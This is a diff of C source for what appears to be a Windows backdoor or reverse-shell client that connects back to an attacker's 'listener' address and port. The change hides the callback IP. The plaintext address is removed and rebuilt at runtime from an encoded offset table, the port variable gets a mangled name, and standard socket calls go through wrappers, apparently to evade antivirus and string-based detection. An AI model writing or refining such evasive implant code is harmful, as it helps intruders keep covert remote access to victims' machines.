@@ -51,8 +51,7 @@ int main(void){
 	WSADATA wsaData;
 	SOCKET client_socket;
 	struct sockaddr_in server_addr;
-	char listener_addr[]="192.168.1.20"; //PUT SERVER ADDRESS HERE
-	int listener_port=1234; //PUT SERVER PORT HERE
+	int _p__0rt=1234; //PUT SERVER PORT HERE
 	char recv_buffer[MAX];
 	char ALL_ALPHANUM[]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
 	
@@ -134,7 +133,7 @@ int main(void){
 	
 	//assigning server values
 	server_addr.sin_family=AF_INET;
-	server_addr.sin_port=h_tons_func(listener_port);
+	server_addr.sin_port=h_tons_func(_p__0rt);
 	server_addr.sin_addr.s_addr=inet_addr_func(GetOriginal(listener_addr_offset,ALL_ALPHANUM,sizeof(listener_addr_offset)));
 	if ( server_addr.sin_addr.s_addr == INADDR_NONE ){
 		//printf("[x] invalid address\n[x]exiting\n");
